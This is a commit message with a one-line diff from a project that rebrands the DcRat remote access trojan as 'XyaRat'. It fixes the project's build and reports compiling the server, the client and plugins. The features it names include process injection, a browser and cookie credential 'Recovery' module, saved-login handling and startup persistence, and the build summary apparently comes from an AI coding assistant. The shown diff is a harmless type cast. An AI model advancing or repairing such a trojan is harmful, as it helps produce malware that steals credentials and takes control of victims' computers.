fix: Upgrade to .NET 4.8 and fix VS2022 build compatibility
- Upgraded all projects from .NET 4.0/4.6.1 to .NET 4.8 for VS2022 compatibility
- Added 32 missing source files to project configurations
- Fixed icon resource paths (dcrat.ico → XyaRat.ico, DcRat_png.png → XyaRat_png.png)
- Fixed TaskScheduler package PublicKeyToken mismatch
- Enhanced Logger classes with Log() method and LogLevel enum for both Client and Server
- Added missing methods: ConnectionResilience.RecordFailure(), ProcessInjection.FindSuitableTarget()
- Fixed type conversion issues in ClientSocket, PluginCommunication, and NormalStartup
- Added System.Security.Authentication using for CertificatePinning
- Simplified HandleRecovery to use plain text storage (removed AES-GCM dependency)
- Fixed SavedLogin accessibility from internal to public

Build Results:
✅ Server (XyaRat.exe): 12.5 MB - Built successfully
✅ Client (Client.exe): 446 KB - Built successfully
✅ 18 Plugin DLLs: Built successfully
⚠️ Recovery.dll: Skipped (10 remaining Browser/Cookie class errors)

All core components now compile successfully on Visual Studio 2022.

+++ Client/Helper/PluginCommunication.cs
@@ -122,7 +122,7 @@ namespace Client.Helper
                         continue;
                     
                     MsgPack msg = kvp.Value.Peek();
-                    int priority = msg.ForcePathObject("Priority").AsInteger;
+                    int priority = (int)msg.ForcePathObject("Priority").AsInteger;
                     
                     if (priority > highestPriority)
                     {
